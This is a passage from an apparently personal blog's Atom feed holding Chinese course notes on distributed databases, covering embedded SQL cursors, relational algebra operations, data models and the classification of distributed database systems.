:cc</p><p>通过循环调用fetch语句，获取所有元组</p><p>游标关闭语句（ close ）</p><p>EXEC SQL close c</p><p>游标更新定义</p><p>declare c cursor for select * from EMP where city = ‘Parise’ for update</p><p>修改当前游标元组</p><p>update EMP set SAL = SAL + 100 where current of c</p><ul><li>关系代数</li></ul><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image003.png" alt="clip_image003"></p><ul><li>关系代数的符号</li></ul><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image004.png" alt="clip_image004"></p><ul><li><p>关系代数表达式</p></li><li><ul><li>并</li></ul></li></ul><p>R∪S＝｛t∣t∈R∨t∈S｝</p><p>–t是元组变量</p><p>–R和S是关系代数表达式</p><p>–R与S的degree必须相同</p><p>–R与S的属性类型必须相同</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image005.png" alt="clip_image005"></p><ul><li>交</li></ul><p>R∩S＝｛t∣t∈R∧t∈S｝</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image006.png" alt="clip_image006"></p><ul><li>差</li></ul><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image007.png" alt="clip_image007"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image008.png" alt="clip_image008"></p><ul><li>积</li></ul><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image009.png" alt="clip_image009"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image010.png" alt="clip_image010"></p><ul><li>选择</li></ul><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image011.png" alt="clip_image011"></p><p>–水平划分关系</p><p>–F是一个逻辑表达式，表示所选的元组应满足的条件</p><p>–F由逻辑运算符┐(NOT)、∧(AND)、∨(OR)连接算术表达式构成</p><p>•算术表达式<img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image012.png" alt="clip_image012">形为XθY，θ可以是&gt;,&lt;,=, ≤,≥或≠，X和Y可以是属性名、常量或简单函数</p><ul><li>投影</li></ul><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image013.png" alt="clip_image013"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image014.png" alt="clip_image014"></p><ul><li>自然联接</li></ul><p>设R的属性集为{X,Y}，S的属性集为{Y,Z}</p><p>R∞S=t|t=&lt;X,Y,Z&gt;∧t[X,Y]∈R∧t[Y,Z]∈S}</p><p>–相当于在R×S中选取R和S的所有公共属性值都相等的元组，并在结果中去掉重复属性</p><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image015.png" alt="clip_image015"></p><ul><li>θ联接</li></ul><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image016.png" alt="clip_image016"></p><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image017.png" alt="clip_image017"></p><ul><li>等值联接</li></ul><p>在θ联接中，当θ为等号时，称为“等值联接”</p><p>等值联接是θ联接中比较常见的形式</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image018.png" alt="clip_image018"></p><ul><li>关系代数封闭性</li></ul><p>任意关系代数操作的结果仍是一个关系</p><p>关系代数的封闭性保证了关系代数操作的可嵌套性</p><ul><li>关系代数-删除</li></ul><p>例：“从数据库中删除姓名为‘Rose’的学生”</p><p>Student←Student－σname=‘Rose’(Student)</p><ul><li>关系代数-插入</li></ul><p>例：插入一个新的学生</p><p>S1←S1∪ { (‘001’,’Rose’,19) }</p><ul><li>关系代数-修改</li></ul><p>例：“将所有男学生的学号前加上字母M”</p><p>Student←π‘M’||sno,name, sex, age(σsex=‘M’(Student)) ∪ (Student－σsex=‘M’(Student))</p><ul><li>关系代数-查询</li></ul><p>例：查询所有状态大于20的供应商的供应商号</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image019.png" alt="clip_image019"></p><p>​         查询供应了London城市中零件的供应商号</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image020.png" alt="clip_image020"></p><p>查询状态大于20并且没有零件的城市</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image021.png" alt="clip_image021"></p><ul><li>关系代数与SQL</li></ul><p>例：</p><p>供应商关系模式：S (S#, SNAME, STATUS, CITY)</p><p>求住在同一个城市里的供应商号码对</p><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image022.png" alt="clip_image022"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image023.png" alt="clip_image023"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.数据与数据模型&lt;/p&gt;
&lt;p&gt;•数据&lt;/p&gt;
&lt;p&gt; – 给定事实&lt;/p&gt;
&lt;p&gt;•数据模型 &lt;/p&gt;
&lt;p&gt;– 抽象的, 自含的, 对象和操作符等的逻辑定义, 所有这些一起组成了抽象机&lt;/p&gt;
&lt;p&gt;•实现&lt;/p&gt;
&lt;p&gt; – 真实机器上的物理实现&lt;/p&gt;
&lt;p&gt;•数
      
    
    </summary>
    
      <category term="数据库" scheme="http://JKZhang.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="数据库" scheme="http://JKZhang.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="分布式" scheme="http://JKZhang.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>分布式数据库——第一章 高级数据库概述</title>
    <link href="http://JKZhang.github.io/2019/03/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E2%80%94%E2%80%94%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E8%BF%B0/"/>
    <id>http://JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/</id>
    <published>2019-03-29T13:00:00.000Z</published>
    <updated>2019-03-29T14:16:31.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一章-高级数据库概述"><a href="#第一章-高级数据库概述" class="headerlink" title="第一章 高级数据库概述"></a>第一章 高级数据库概述</h1><p>1.数据与存储系统</p><p>•存储层次</p><ul><li>Register</li><li>Cache</li><li>主存（Main memory）</li><li>辅存（Disk）</li></ul><p>•新型存储体系</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image001.png" alt="clip_image001"></p><p>2.数据库系统发展</p><p>•数据模型</p><ul><li>数据结构, 操作</li><li>层次, 网状, 关系, OO, 时态, 空间, 图, 时空, 文本, 工程, 生物, 地理, 图像数据库等</li></ul><p>•运行环境</p><ul><li>集中式, 分布式, 并行,移动, Cluster, Web, 嵌入，云等</li></ul><p>•计算方式</p><ul><li>被动/主动, 实时数据库</li><li>批处理/流处理等</li></ul><p>•数据库（DB）</p><ul><li>可以存储长时间的信息集合</li></ul><p>•数据库管理系统（DBMS）</p><ul><li>允许用户使用专门的数据定义语言和操作语言, 支持大数据量数据的长时间存储,并能正确控制多个用户对数据有效存取的软件</li></ul><p>3.关系模型与面向对象模型</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image002.png" alt="clip_image002"></p><p>•概念层 ——直接面对用户</p><ul><li>语义表达能力强</li><li>易于被用户理解</li><li>独立于任何DBMS</li><li>易于向逻辑模型转换</li></ul><p>•逻辑层 ——数据模型</p><ul><li>用户通过DBMS看到的现实世界</li><li>传统的DBMS模型：层次，网络，关系模型</li><li>新型的DBMS模型：O—O模型，对象—关系模型等</li></ul><p>•物理层 ——对用户透明</p><ul><li>数据的表示（存储格式）</li><li>数据的索引</li><li>高效的操作实现</li><li>一致性维护及故障处理</li></ul><p>•为什么需要OODB</p><p>一些数据结构复杂，难于用关系模型描述。</p><p>•面向对象模型 —— OO模型</p><ul><li><p>基本概念：</p></li><li><ul><li>对象标识 OID</li><li>对象封装</li><li>类和类的嵌套</li><li>类和类的继承</li><li>持久对象概念</li></ul></li><li><p>数据模型</p></li></ul><p>用对象与类结构以及类间继承与组合关系建立数据间的复杂结构关系</p><ul><li>模式上的操作</li></ul><p>用对象与类中方法构作模式上的操作，这种操作语义远强于传统数据模型</p><ul><li><p>OODBMS必须满足两个基本条件</p></li><li><ul><li>支持核心的面向对象数据模型</li><li>支持传统数据库系统所具有的数据库特征</li></ul></li></ul><p>•特化、泛化</p><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image003.png" alt="clip_image003"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image004.png" alt="clip_image004"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image005.png" alt="clip_image005"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image006.png" alt="clip_image006"></p><p>•概念模型及其描述工具</p><ul><li>E/R 模型：实体—联系模型</li></ul><p>–用实体描述对象属性</p><p>–用联系描述对象间的语义关系</p><ul><li>基于UML的面向对象的模型 （Unified Modeling      Language）</li></ul><p>–静态对象模型</p><ul><li>描述对象的属性，关联，聚合，继承，等等</li></ul><p>–动态对象模型</p><ul><li>描述对象行为，相互作用，合作和变化，等等</li></ul><p>–支持概念模型与逻辑模型无缝联接</p><ul><li>基于XML的对象模型</li></ul><p>–易学，易扩充</p><p>–易于快速开发软件</p><p>–多个工具可以支持结构转换</p><p>4.集中式系统与分布式系统</p><p>•分布式数据库系统</p><ul><li><p>定义: 物理上分散而逻辑上集中的数据库系统.</p></li><li><p>特点</p></li><li><ul><li>物理分布性</li></ul></li></ul><p>数据不在单个Site上, 按全局需求将数据划分成一定的数据子集, 分散存储在各个Site上</p><ul><li>逻辑整体性</li></ul><p>各个Site上的数据子集, 相互间有严密的约束规则加以限定, 逻辑上是一个整体</p><ul><li>站点自治性</li></ul><p>各个Site上的数据(即LDB)是由本地的DBMS管理, 具有自治处理能力</p><p>•为什么需要分布式系统</p><ul><li>分布为并行执行提供了可能性</li><li>复制增加了可用性</li></ul><p>•分布式数据库分类</p><ul><li><p>同构型(Homogeneous)</p></li><li><ul><li>各个Site上的DB数据模型相同</li><li>进一步可分为</li></ul><p>同构同质型</p><p>同构异质型</p></li><li><p>异构型(Heterogeneous)</p></li></ul><p>各个Site上的DB数据模型不同</p><ul><li>集中型</li></ul><p>DDB的全局控制信息位于一个中心Sie上</p><ul><li>分散型</li></ul><p>每个Site上包含有全局控制信息的一个Copy</p><ul><li>可变型</li></ul><p>DDB分成两组, 一组Site包含全局控制信息Copy(主Site), 另一组不含全局Copy(辅Site)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第一章-高级数据库概述&quot;&gt;&lt;a href=&quot;#第一章-高级数据库概述&quot; class=&quot;headerlink&quot; title=&quot;第一章 高级数据库概述&quot;&gt;&lt;/a&gt;第一章 高级数据库概述&lt;/h1&gt;&lt;p&gt;1.数据与存储系统&lt;/p&gt;
&lt;p&gt;•存储层次&lt;/p&gt;
&lt;ul&gt;
&lt;l
      
    
    </summary>
    
      <category term="数据库" scheme="http://JKZhang.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="数据库" scheme="http://JKZhang.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="分布式" scheme="http://JKZhang.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
</feed>
